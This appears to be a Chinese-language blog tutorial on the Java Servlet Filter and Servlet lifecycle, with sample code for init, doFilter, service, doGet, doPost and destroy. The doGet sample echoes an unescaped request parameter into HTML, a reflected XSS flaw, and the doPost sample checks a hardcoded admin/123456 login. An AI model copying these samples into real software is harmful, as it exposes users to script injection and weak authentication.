+<p>Filter 是 Java Servlet 规范中的一个接口，允许你在请求到达 Servlet 之前或响应发送给客户端之前，进行拦截和</p>
+<p>处理。</p>
+<p>过滤器通常用于实现统一日志记录、权限校验、编码设置、请求修改、响应压缩等功能。</p>
+<p>过滤器可以链式调用，一个请求可以经过多个过滤器。</p>
+<p><strong>1.初始化时调用的方法</strong></p>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>init(FilterConfig config) </code>是 Filter 初始化时调用的方法。</li>
+<li>容器创建 Filter 实例后，会调用此方法来完成初始化工作。</li>
+<li>你可以在这里读取配置参数、初始化资源或做其他准备。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(FilterConfig config) <span style="color:#66d9ef">throws</span> ServletException
+</span></span></code></pre></div><ul>
+<li>参数 FilterConfig config 是过滤器配置对象，提供了访问过滤器初始化参数和 ServletContext 的方法。</li>
+<li>ServletException 是初始化失败时可以抛出的异常。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(FilterConfig filterConfig) <span style="color:#66d9ef">throws</span> ServletException {
+</span></span><span style="display:flex;"><span>	System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;XssFilter.init&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>2.核心过滤方法，处理请求和响应，决定是否放行请求</strong></p>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>doFilter() </code>是过滤器中最重要的方法，每当请求匹配到该过滤器时，都会调用它。</li>
+<li>它负责对请求进行预处理、调用链中下一个过滤器或目标资源（Servlet、JSP等），然后对响应进行后处理。</li>
+<li>可以控制请求是否继续传递，或者直接拦截请求并返回响应。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doFilter</span>(ServletRequest req, ServletResponse resp, FilterChain chain) <span style="color:#66d9ef">throws</span> IOException, ServletException
+</span></span></code></pre></div><ul>
+<li>ServletRequest req ：封装客户端请求信息。</li>
+<li>ServletResponse resp ：用于发送响应数据。</li>
+<li>FilterChain chain ：过滤器链对象，负责将请求传递给下一个过滤器或目标资源。</li>
+</ul>
+<pre tabindex="0"><code>@WebFilter(&#34;/*&#34;) 
+public class EncodingFilter implements Filter {
+
+    @Override
+    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
+            throws IOException, ServletException {
+        
+        // 1. 预处理：设置请求和响应编码为 UTF-8
+        // 注意：原代码中的单个斜杠 &#34;/&#34; 是错误的，Java 注释需使用 &#34;//&#34;
+        request.setCharacterEncoding(&#34;UTF-8&#34;);
+        response.setCharacterEncoding(&#34;UTF-8&#34;);
+        System.out.println(&#34;EncodingFilter: 请求进入，设置编码&#34;);
+
+        // 2. 放行请求
+        // 调用 chain.doFilter 将请求传递给过滤链的下一个组件（下一个 Filter 或 Servlet）
+        chain.doFilter(request, response);
+
+        // 3. 后处理逻辑
+        // 在目标 Servlet 处理完业务并准备返回响应时执行
+        System.out.println(&#34;EncodingFilter: 响应返回，后处理完成&#34;);
+    }
+
+    // 注意：根据接口规范，虽然 Java 8 后不强制，但建议保留 init 和 destroy 方法的空实现
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {}
+
+    @Override
+    public void destroy() {}
+}
+</code></pre><p><strong>3.销毁</strong></p>
+<p>作⽤</p>
+<ul>
+<li>destroy() 是容器在卸载 Servlet 或 Filter 实例之前调用的方法。</li>
+<li>用来释放资源、关闭连接、停止线程等，做清理工作。</li>
+<li>只会被调用一次。</li>
+</ul>
+<p>⽅法</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy</span>()
+</span></span></code></pre></div><p>无参数，无返回值。</p>
+<p>不允许抛出异常。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy</span>() {
+</span></span><span style="display:flex;"><span><span style="color:#75715e">//关闭数据库连接</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (dbConnection <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>			dbConnection.<span style="color:#a6e22e">close</span>();
+</span></span><span style="display:flex;"><span>	  } <span style="color:#66d9ef">catch</span> (SQLException e) {
+</span></span><span style="display:flex;"><span>			e.<span style="color:#a6e22e">printStackTrace</span>();
+</span></span><span style="display:flex;"><span>	  }
+</span></span><span style="display:flex;"><span>   }
+</span></span><span style="display:flex;"><span>	System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;资源已释放，Servlet/Filter 销毁&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="servlet-容器">Servlet 容器<a hidden class="anchor" aria-hidden="true" href="#servlet-容器">#</a></h4>
+<ol>
+<li><strong>容器启动阶段</strong></li>
+</ol>
+<ul>
+<li>
+<p>当你启动 Tomcat 或部署一个 Web 应用时，容器会：</p>
+<ul>
+<li>
+<p>扫描 web.xml 配置文件或注解（ @WebListener , @WebFilter , @WebServlet ）；</p>
+</li>
+<li>
+<p>自动创建 Listener、Filter、Servlet 实例；</p>
+</li>
+<li>
+<p>依次调用 Listener 的 contextInitialized() 、Filter 的 init() 和 Servlet 的 init() 方法。</p>
+</li>
+</ul>
+</li>
+</ul>
+<ol start="2">
+<li><strong>请求处理阶段</strong></li>
+</ol>
+<ul>
+<li>
+<p>当有 HTTP 请求到达时，容器会：</p>
+<ul>
+<li>
+<p>根据请求 URL 匹配 Filter 链，自动依次调用每个 Filter 的 doFilter() 方法；</p>
+</li>
+<li>
+<p>放行后，调用对应 Servlet 的 service() （或 doGet() / doPost() ）方法；</p>
+</li>
+<li>
+<p>响应生成后，Filter 继续进行响应的后处理。</p>
+</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li><strong>应用关闭阶段</strong></li>
+</ol>
+<ul>
+<li>
+<p>当你停止 Tomcat 或卸载 Web 应用时，容器会：</p>
+<ul>
+<li>
+<p>自动调用 Servlet 的 destroy() ；</p>
+</li>
+<li>
+<p>调用 Filter 的 destroy() ；</p>
+</li>
+<li>
+<p>调用 Listener 的 contextDestroyed() 。</p>
+</li>
+</ul>
+</li>
+</ul>
+<h5 id="1-servlet-初始化">1. Servlet 初始化<a hidden class="anchor" aria-hidden="true" href="#1-servlet-初始化">#</a></h5>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>init(ServletConfig config)</code> 是 Servlet 初始化方法，容器在创建 Servlet 实例后会调用它。</li>
+<li>主要用来完成 Servlet 的初始化工作，比如读取配置参数、准备资源等。</li>
+<li>它只会被调用一次。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(ServletConfig config) <span style="color:#66d9ef">throws</span> ServletException
+</span></span></code></pre></div><ul>
+<li>参数 <code>ServletConfig config</code> 是容器传递给 Servlet 的配置对象，包含该 Servlet 的配置信息（如初始化参数、Servlet 名称、ServletContext 等）。</li>
+<li><code>ServletException</code> 是初始化失败时抛出的异常。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init</span>(ServletConfig config) <span style="color:#66d9ef">throws</span> ServletException {
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;HelloServlet.init&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h5 id="2-servlet-处理客户端请求的核心入口">2. Servlet 处理客户端请求的核心入口<a hidden class="anchor" aria-hidden="true" href="#2-servlet-处理客户端请求的核心入口">#</a></h5>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>service()</code> 方法是 Servlet 处理客户端请求的核心入口。</li>
+<li>容器每接收到一次请求，都会调用 Servlet 的 <code>service()</code> 方法，将请求和响应对象传入。</li>
+<li>该方法负责根据请求类型（GET、POST、PUT、DELETE等）分发调用相应的 <code>doGet()</code>, <code>doPost()</code> 等具体处理方法。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">service</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException
+</span></span></code></pre></div><ul>
+<li><code>HttpServletRequest req</code> ：封装了客户端请求的所有信息，如参数、头信息、请求方法等。</li>
+<li><code>HttpServletResponse resp</code> ：用于向客户端发送响应数据，如响应头、内容等。</li>
+<li>抛出 <code>ServletException</code> 和 <code>IOException</code> ，表示处理请求时可能出现的异常。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">service</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;HelloServlet.service&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h5 id="3-客户端通过-http-get-方式发送的请求">3. 客户端通过 HTTP GET 方式发送的请求<a hidden class="anchor" aria-hidden="true" href="#3-客户端通过-http-get-方式发送的请求">#</a></h5>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>doGet()</code> 是专门用于处理客户端通过 HTTP GET 方式发送的请求。</li>
+<li>浏览器访问一个网址、点击超链接、或者表单使用 GET 方法提交时，服务器调用这个方法。</li>
+<li>该方法负责读取请求参数、执行业务逻辑并生成响应内容。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doGet</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException
+</span></span></code></pre></div><ul>
+<li><code>HttpServletRequest req</code> ：封装请求的所有数据，包括参数、头信息、请求路径等。</li>
+<li><code>HttpServletResponse resp</code> ：用于构建和发送响应，如设置响应头、写出响应体。</li>
+<li>抛出 <code>ServletException</code> 和 <code>IOException</code> ，表明请求处理时可能产生的异常。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doGet</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 设置响应内容类型和编码</span>
+</span></span><span style="display:flex;"><span>    resp.<span style="color:#a6e22e">setContentType</span>(<span style="color:#e6db74">&#34;text/html;charset=UTF-8&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 获取请求参数</span>
+</span></span><span style="display:flex;"><span>    String name <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;name&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (name <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;访客&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 获取响应输出流</span>
+</span></span><span style="display:flex;"><span>    PrintWriter out <span style="color:#f92672">=</span> resp.<span style="color:#a6e22e">getWriter</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 输出HTML内容</span>
+</span></span><span style="display:flex;"><span>    out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;欢迎，&#34;</span> <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;！&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;/body&gt;&lt;/html&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>工作流程</strong></p>
+<ol>
+<li>容器收到 GET 请求后，调用 Servlet 的 <code>service()</code> 方法。</li>
+<li><code>service()</code> 判断请求方法为 GET，调用 <code>doGet()</code> 。</li>
+<li>开发者重写 <code>doGet()</code> ，实现业务逻辑，向响应流写内容。</li>
+<li>容器将响应发送回客户端。</li>
+</ol>
+<h5 id="4-客户端通过-http-post-方法发送的请求">4. 客户端通过 HTTP POST 方法发送的请求<a hidden class="anchor" aria-hidden="true" href="#4-客户端通过-http-post-方法发送的请求">#</a></h5>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>doPost()</code> 用来处理客户端通过 HTTP POST 方法发送的请求。</li>
+<li>POST 请求通常用于提交表单数据、上传文件、发送较大或敏感的数据。</li>
+<li>Servlet 接收到 POST 请求时，会调用此方法进行处理。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doPost</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException
+</span></span></code></pre></div><ul>
+<li>参数 <code>req</code> 封装了请求中的数据（请求体、参数、请求头等）。</li>
+<li>参数 <code>resp</code> 用于构建 and 发送响应（设置响应头、状态码、写响应体）。</li>
+<li>抛出异常表示处理过程中可能出现的错误。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">doPost</span>(HttpServletRequest req, HttpServletResponse resp) <span style="color:#66d9ef">throws</span> ServletException, IOException {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 设置请求编码，防止中文乱码</span>
+</span></span><span style="display:flex;"><span>    req.<span style="color:#a6e22e">setCharacterEncoding</span>(<span style="color:#e6db74">&#34;UTF-8&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 设置响应内容类型和编码</span>
+</span></span><span style="display:flex;"><span>    resp.<span style="color:#a6e22e">setContentType</span>(<span style="color:#e6db74">&#34;text/html;charset=UTF-8&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 从请求体中获取参数</span>
+</span></span><span style="display:flex;"><span>    String username <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;username&#34;</span>);
+</span></span><span style="display:flex;"><span>    String password <span style="color:#f92672">=</span> req.<span style="color:#a6e22e">getParameter</span>(<span style="color:#e6db74">&#34;password&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 模拟业务处理</span>
+</span></span><span style="display:flex;"><span>    PrintWriter out <span style="color:#f92672">=</span> resp.<span style="color:#a6e22e">getWriter</span>();
+</span></span><span style="display:flex;"><span>    out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;html&gt;&lt;body&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#e6db74">&#34;admin&#34;</span>.<span style="color:#a6e22e">equals</span>(username) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#e6db74">&#34;123456&#34;</span>.<span style="color:#a6e22e">equals</span>(password)) {
+</span></span><span style="display:flex;"><span>        out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;登录成功，欢迎 &#34;</span> <span style="color:#f92672">+</span> username <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;!&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;h1&gt;登录失败，用户名或密码错误！&lt;/h1&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    out.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;&lt;/body&gt;&lt;/html&gt;&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>工作流程</strong></p>
+<ol>
+<li>客户端通过 POST 方法发送请求，通常提交表单数据。</li>
+<li>容器调用 Servlet 的 <code>service()</code> 方法。</li>
+<li><code>service()</code> 方法检测到请求是 POST，调用 <code>doPost()</code> 。</li>
+<li>开发者在 <code>doPost()</code> 中处理请求参数，执行业务逻辑，生成响应。</li>
+</ol>
+<h5 id="5-servlet-被销毁">5. Servlet 被销毁<a hidden class="anchor" aria-hidden="true" href="#5-servlet-被销毁">#</a></h5>
+<p><strong>作用</strong></p>
+<ul>
+<li><code>destroy()</code> 方法用于 Servlet 被销毁时执行清理操作。</li>
+<li>容器在卸载 Servlet 或关闭应用服务器时调用此方法。</li>
+<li>开发者在这里释放占用的资源，如关闭数据库连接、清理缓存、停止线程等。</li>
+</ul>
+<p><strong>方法</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy</span>()
+</span></span></code></pre></div><ul>
+<li>无参数，无返回值。</li>
+<li>不允许抛出异常。</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#a6e22e">@Override</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">destroy</span>() {
+</span></span><span style="display:flex;"><span>    System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;HelloServlet.destroy&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h4 id="总结">总结<a hidden class="anchor" aria-hidden="true" href="#总结">#</a></h4>
+<ol>
+<li>作用</li>
+</ol>
+<table>
+  <thead>
+      <tr>
+          <th><strong>组件</strong></th>
+          <th><strong>作用</strong></th>
+          <th><strong>生命周期管理者</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Tomcat</strong></td>
+          <td>Java Web 容器，运行环境</td>
+          <td>操作系统/自身</td>
+      </tr>
+      <tr>
+          <td><strong>Servlet</strong></td>
+          <td>核心业务处理单元</td>
+          <td>Tomcat</td>
+      </tr>
+      <tr>
+          <td><strong>Filter</strong></td>
+          <td>请求/响应拦截、预处理和后处理</td>
+          <td>Tomcat</td>
+      </tr>
+      <tr>
+          <td><strong>Listener</strong></td>
+          <td>生命周期事件监听和资源管理</td>
+          <td>Tomcat</td>
+      </tr>
+  </tbody>
+</table>
+<ol start="2">
+<li>流程</li>
+</ol>
+<pre tabindex="0"><code>Web应用启动
+↓
+Listener初始化（contextInitialized）
+↓
+Filter初始化（init）
+↓
+Servlet实例化及初始化（init）
+↓
+请求到来
+↓
+Filter执行请求预处理（doFilter）
+↓
+Servlet执行业务处理（service/doGet/doPost）
+↓
+响应返回，Filter响应后处理
+↓
+Web应用关闭
+↓
+Servlet销毁（destroy）
+↓
+Filter销毁（destroy）
+↓
+Listener销毁（contextDestroyed）
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">H4ck3r Station</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            const id = this.getAttribute("href").substr(1);
+            if (!id) return;
+
+            
+            
+            const nextUl = this.nextElementSibling;
+            if (this.closest('.toc') && nextUl && nextUl.tagName === 'UL') {
+                const rect = this.getBoundingClientRect();
+                const offsetX = e.clientX - rect.left;
+
+                
+                if (offsetX < 45) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isVisible = window.getComputedStyle(nextUl).display !== 'none';
+                    nextUl.style.display = isVisible ? 'none' : 'block';
+                    this.parentElement.classList.toggle('is-expanded');
+                    
+                    return false; 
+                }
+            }
+
+            
+            
+            e.preventDefault();
+            const targetElement = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+            if (targetElement) {
+                if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                    targetElement.scrollIntoView({ behavior: "smooth" });
+                } else {
+                    targetElement.scrollIntoView();
+                }
+                
+                if (id === "top") {
+                    history.replaceState(null, null, " ");
+                } else {
+                    history.pushState(null, null, `#${id}`);
+                }
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script></body>
+
+</html>
